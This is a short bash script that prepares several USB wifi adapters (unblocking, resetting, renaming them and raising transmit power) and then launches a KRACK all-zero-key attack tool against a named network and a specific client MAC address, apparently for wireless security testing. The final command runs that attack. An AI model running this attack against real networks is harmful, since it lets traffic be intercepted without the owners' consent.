#!/bin/bash

#declare -a interfaces=("wlp4s0" "wlx6470021df7b9" "wlx503eaa526d33" "wlx503eaa527cb7")
declare -a interfaces=("wlx6470021df7b9" "wlx503eaa526d33")

init() {
    echo "Initializaing"
    nmcli radio wifi on
    sleep 1
    nmcli radio wifi off
    sleep 1
    sudo rfkill unblock wifi
}

reset() {
    for interface in "${interfaces[@]}"
    do
        echo "Resetting interface: $interface"
        sudo ifconfig $interface down
        sudo iwconfig $interface mode managed
        sudo ifconfig $interface up
    done
}

rename_interface() { 
    sudo ifconfig wlx503eaa526d33 down
    sudo ip link set wlx503eaa526d33 name wla
    sudo ifconfig wla up
    
    sudo ifconfig wlx503eaa527cb7 down
    sudo ip link set wlx503eaa527cb7 name wlb
    sudo ifconfig wlb up 
    
    sudo ifconfig wlx6470021df7b9 down
    sudo ip link set wlx6470021df7b9 name wlc
    sudo ifconfig wlc up 
}
 
undo_rename() {
    sudo ifconfig wla down
    sudo ip link set wla name wlx503eaa526d33
    sudo ifconfig wlx503eaa526d33 up
    
    sudo ifconfig wlb down
    sudo ip link set wlb name wlx503eaa527cb7
    sudo ifconfig wlx503eaa527cb7 up
    
    sudo ifconfig wlc down
    sudo ip link set wlc name wlx6470021df7b9
    sudo ifconfig wlx6470021df7b9 up
}

#init
rfkill unblock wifi
iwconfig txpower wlx503eaa527cb7 40 #Set tramit power to 40
reset
rename_interface
./krack-all-zero-tk.py -d wlp4s0 wlb ProDNPhotog --target "30:07:4D:3A:96:04"
undo_rename
reset
